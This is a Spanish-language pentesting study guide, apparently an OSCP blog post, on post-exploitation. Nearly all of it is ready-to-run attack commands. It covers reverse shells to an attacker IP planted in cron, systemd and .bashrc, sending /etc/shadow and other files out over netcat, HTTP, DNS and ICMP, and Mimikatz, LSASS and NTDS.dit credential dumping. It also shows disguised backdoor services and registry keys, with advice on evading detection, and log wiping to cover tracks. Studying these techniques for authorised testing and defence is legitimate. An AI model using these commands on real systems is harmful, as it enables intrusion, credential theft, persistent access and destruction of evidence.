---
redirect_from:
  - /posts/POST-EXPLOTACION-LATERAL-MOVEMENT-Apuntes/

title: "Post-Explotación y Lateral Movement - Guía Completa"
date: Thu Dec 04 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Post-Explotación]
tags: [post-explotacion, lateral-movement, persistence, pivoting, credential-dumping, mimikatz, transferencia-archivos, covering-tracks, oscp, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-04-post-explotacion-lateral-movement.png
---

# Post-Explotación y Lateral Movement

Una vez comprometido un sistema, la fase de post-explotación determina el valor real del acceso obtenido. Esta guía cubre técnicas avanzadas de transferencia de archivos, credential dumping, persistencia, pivoting, lateral movement, exfiltración de datos y covering tracks.

---

## 1. Transferencia de Archivos

### 1.1 Desde Atacante a Víctima

#### HTTP Server (Python)

```bash
# En máquina atacante
python3 -m http.server 80
python3 -m http.server 8000 --bind 10.10.14.5

# Desde víctima Linux
wget http://10.10.14.5/linpeas.sh
curl http://10.10.14.5/exploit.py -o exploit.py
curl http://10.10.14.5/shell.elf -o /tmp/shell && chmod +x /tmp/shell

# Desde víctima Windows
certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.5/winPEAS.exe' -OutFile 'C:\Temp\winPEAS.exe'"
iwr -uri http://10.10.14.5/mimikatz.exe -OutFile mimikatz.exe
```

#### SMB Server (Impacket)

```bash
# Iniciar servidor SMB en atacante
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share /tmp/tools -smb2support -username user -password pass

# Desde Windows víctima
copy \\10.10.14.5\share\nc.exe C:\Temp\
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\mimikatz.exe .

# Ejecutar sin copiar
\\10.10.14.5\share\nc.exe -e cmd.exe 10.10.14.5 443
```

#### FTP Server

```bash
# Instalar y configurar pyftpdlib
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w

# Desde víctima Windows
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

#### Base64 (Sin Conexión Directa)

```bash
# En atacante: encodear archivo
base64 -w0 exploit.sh > exploit.b64

# En víctima: copiar string y decodear
echo "SGVsbG8gV29ybGQK..." | base64 -d > exploit.sh
```

**📝 OSCP Tip**: Si firewall bloquea conexiones salientes, usa base64 encoding para transferir scripts pequeños.

---

### 1.2 Desde Víctima a Atacante (Exfiltración)

#### Netcat

```bash
# Atacante escuchando
nc -nlvp 4444 > data.zip

# Víctima enviando
nc 10.10.14.5 4444 < data.zip
cat /etc/shadow | nc 10.10.14.5 4444
```

#### SCP

```bash
# Desde víctima a atacante (si tienes SSH)
scp database.sql user@10.10.14.5:/tmp/loot/
scp -r /var/www/html user@10.10.14.5:/tmp/backup/
```

#### HTTP POST

```bash
# Atacante con listener básico
nc -nlvp 8080

# Víctima enviando archivo
curl -X POST -F "file=@/etc/passwd" http://10.10.14.5:8080/
```

#### DNS Exfiltration (Evasión de Firewall)

```bash
# Enviar datos vía DNS queries
for line in $(cat /etc/passwd | base64 -w0); do
    dig $line.attacker-domain.com
done
```

---

## 2. Credential Dumping

### 2.1 Linux - Passwords y Hashes

#### /etc/shadow

```bash
# Leer directamente (requiere root)
cat /etc/shadow

# Combinar passwd y shadow para John
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crackear con John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

#### SSH Keys

```bash
# Buscar llaves privadas
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find /home -name "*.key" 2>/dev/null

# Copiar llave encontrada
cat /home/user/.ssh/id_rsa

# Usar llave (desde atacante)
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10

# Si tiene passphrase, crackear
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

#### Historial de Comandos

```bash
# Bash history
cat ~/.bash_history
cat /root/.bash_history

# MySQL history
cat ~/.mysql_history

# Python history
cat ~/.python_history

# Buscar passwords en historiales
grep -i "pass\|pwd\|user" ~/.bash_history
```

#### Archivos de Configuración

```bash
# Buscar credenciales en configs
grep -ri "password\|passwd\|pwd" /var/www/ 2>/dev/null
grep -ri "DB_PASSWORD\|DATABASE_PASSWORD" /var/www/ 2>/dev/null

# Archivos de config comunes
cat /var/www/html/config.php
cat /etc/mysql/my.cnf
cat ~/.aws/credentials
```

---

### 2.2 Windows - Credential Dumping

#### Mimikatz

```powershell
# Ejecutar Mimikatz
.\mimikatz.exe

# Elevar privilegios
privilege::debug
token::elevate

# Dumping LSASS
sekurlsa::logonpasswords

# Tickets Kerberos
sekurlsa::tickets

# Dumping SAM (requiere SYSTEM)
lsadump::sam

# Dumping LSA secrets
lsadump::secrets

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:abc123...
```

#### LSASS Dump sin Mimikatz

```powershell
# Método 1: Task Manager (GUI)
# Procesos → lsass.exe → Crear archivo de volcado

# Método 2: Procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Método 3: comsvcs.dll (nativo)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parsear dump con Mimikatz offline
.\mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### Registry SAM Dump

```cmd
# Exportar SAM, SYSTEM y SECURITY
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Parsear con secretsdump (Impacket)
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

#### NTDS.dit (Domain Controller)

```powershell
# Método 1: ntdsutil
ntdsutil
activate instance ntds
ifm
create full C:\Temp\ntds_dump
quit
quit

# Método 2: Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Extraer hashes con secretsdump
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**⚠️ Detección**: Accesos a LSASS y extracción de NTDS.dit son altamente monitoreados por EDR/SIEM.

---

## 3. Persistencia

### 3.1 Linux Persistence

#### Cron Jobs

```bash
# User crontab
crontab -e
@reboot /tmp/.hidden/shell.sh

# System-wide crontab
echo "*/5 * * * * root /tmp/shell.sh" >> /etc/crontab

# Cron directories
echo "bash -i >& /dev/tcp/10.10.14.5/443 0>&1" > /etc/cron.daily/backdoor
chmod +x /etc/cron.daily/backdoor
```

#### SSH Authorized Keys

```bash
# Agregar tu llave pública
echo "ssh-rsa AAAAB3Nza..." >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3Nza..." >> /home/user/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

#### Systemd Service

```bash
# Crear servicio malicioso
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Monitoring Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar y arrancar
systemctl enable backdoor.service
systemctl start backdoor.service
```

#### Bashrc / Profile

```bash
# Agregar al final de .bashrc
echo "bash -i >& /dev/tcp/10.10.14.5/443 0>&1 &" >> /home/user/.bashrc

# Profile global
echo "/tmp/.hidden/shell.sh" >> /etc/profile
```

---

### 3.2 Windows Persistence

#### Registry Run Keys

```powershell
# HKCU (no requiere admin)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Temp\shell.exe"

# HKLM (requiere admin)
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SystemMonitor /t REG_SZ /d "C:\Windows\Temp\service.exe"

# RunOnce (ejecuta una vez y se borra)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Update /t REG_SZ /d "powershell -enc <base64>"
```

#### Scheduled Tasks

```powershell
# Crear tarea programada (cada 5 minutos)
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM

# Al inicio del sistema
schtasks /create /tn "Updater" /tr "powershell -enc <payload>" /sc onstart /ru SYSTEM

# Al login de usuario
schtasks /create /tn "UserMonitor" /tr "C:\backdoor.exe" /sc onlogon
```

#### WMI Event Subscription

```powershell
# Crear evento WMI persistente
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer";
    CommandLineTemplate = "C:\Temp\shell.exe"
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter;
    Consumer = $consumer;
}
```

#### Services

```cmd
# Crear servicio persistente
sc create Backdoor binPath= "C:\Temp\shell.exe" start= auto
sc description Backdoor "System Update Service"
sc start Backdoor

# Modificar servicio existente (ImagePath hijacking)
sc config VulnService binPath= "C:\Temp\shell.exe"
```

**🎯 Técnica**: Usa nombres genéricos como "WindowsUpdate", "SystemMonitor" para evadir detección manual.

---

## 4. Pivoting y Tunneling

### 4.1 SSH Tunneling

#### Local Port Forwarding

```bash
# Hacer accesible puerto remoto desde local
ssh -L 8080:localhost:80 user@10.10.10.10
# Ahora localhost:8080 → 10.10.10.10:80

# Acceder a host interno desde servidor SSH
ssh -L 3306:192.168.1.100:3306 user@10.10.10.10
# localhost:3306 → 192.168.1.100:3306 (vía 10.10.10.10)
```

#### Remote Port Forwarding

```bash
# Exponer puerto local en servidor remoto
ssh -R 8080:localhost:80 user@remote-server
# remote-server:8080 → tu localhost:80
```

#### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Crear SOCKS proxy
ssh -D 1080 user@10.10.10.10

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Usar con herramientas
proxychains nmap -sT 192.168.100.10
proxychains firefox
```

---

### 4.2 Chisel

```bash
# En atacante (servidor)
./chisel server --reverse --port 8000

# En víctima (cliente) - SOCKS proxy
./chisel client 10.10.14.5:8000 R:1080:socks

# En víctima - Port forwarding específico
./chisel client 10.10.14.5:8000 R:3306:192.168.1.100:3306

# Ahora usar proxychains
proxychains nmap -sT 192.168.1.0/24
```

---

### 4.3 Ligolo-ng

```bash
# Atacante (proxy server)
./proxy -selfcert

# Víctima (agent)
./agent -connect 10.10.14.5:11601 -ignore-cert

# En interfaz de ligolo
session
ifconfig
start
```

---

### 4.4 Metasploit Pivoting

```bash
# Autoroute (agregar ruta a red interna)
meterpreter > run autoroute -s 192.168.1.0/24

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100

# SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > run -j
```

---

## 5. Lateral Movement

### 5.1 Pass-the-Hash (PtH)

```bash
# Impacket psexec
impacket-psexec -hashes :abc123... administrator@10.10.10.10

# Impacket wmiexec
impacket-wmiexec -hashes :abc123... administrator@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u administrator -H abc123... -x "whoami"
```

---

### 5.2 WinRM / Evil-WinRM

```bash
# Con credenciales
evil-winrm -i 10.10.10.10 -u administrator -p 'P@ssw0rd'

# Con hash
evil-winrm -i 10.10.10.10 -u administrator -H abc123...
```

---

### 5.3 RDP Pass-the-Hash

```bash
# xfreerdp con hash (Restricted Admin mode requerido)
xfreerdp /u:administrator /pth:abc123... /v:10.10.10.10
```

---

## 6. Exfiltración de Datos

### 6.1 Técnicas de Exfiltración

```bash
# DNS Exfiltration
for line in $(cat data.txt | base64 -w0); do
    nslookup $line.attacker.com
done

# ICMP Exfiltration
cat data.txt | xxd -p | while read line; do
    ping -c 1 -p $line 10.10.14.5
done

# HTTP POST
curl -X POST -d @data.zip http://10.10.14.5:8080/
```

---

## 7. Covering Tracks

### 7.1 Linux

```bash
# Limpiar historial bash
history -c
cat /dev/null > ~/.bash_history

# Eliminar logs
rm -rf /var/log/*

# Timestamp manipulation
touch -r /etc/passwd backdoor.sh
```

### 7.2 Windows

```powershell
# Limpiar Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell history
del (Get-PSReadlineOption).HistorySavePath
```

**⚠️ Ética**: Covering tracks solo es apropiado en pentesting autorizado. En producción, NO eliminar logs.

---

## Conclusión

La post-explotación requiere:
- **Metodología** sistemática
- **Conocimiento** de técnicas de persistencia y pivoting
- **Discreción** para evitar detección

**🎯 OSCP Tip**: Domina transferencia de archivos, credential dumping básico y pivoting con Chisel/SSH. Son esenciales en el examen.

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | Ejemplo |
|---------|---------|---------|
| Persistence | T1053 - Scheduled Task | schtasks, cron |
| Credential Access | T1003 - OS Credential Dumping | Mimikatz, /etc/shadow |
| Lateral Movement | T1550.002 - Pass the Hash | Impacket, Evil-WinRM |
| Command and Control | T1090 - Proxy | Chisel, SSH tunneling |
| Exfiltration | T1048 - Exfiltration Over Alternative Protocol | DNS, ICMP |
| Defense Evasion | T1070 - Indicator Removal | Limpiar logs |

---

## Referencias

- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **Chisel**: https://github.com/jpillora/chisel
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **GTFOBins**: https://gtfobins.github.io/
- **LOLBAS**: https://lolbas-project.github.io/

---

**Última actualización**: 2025-01-10<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
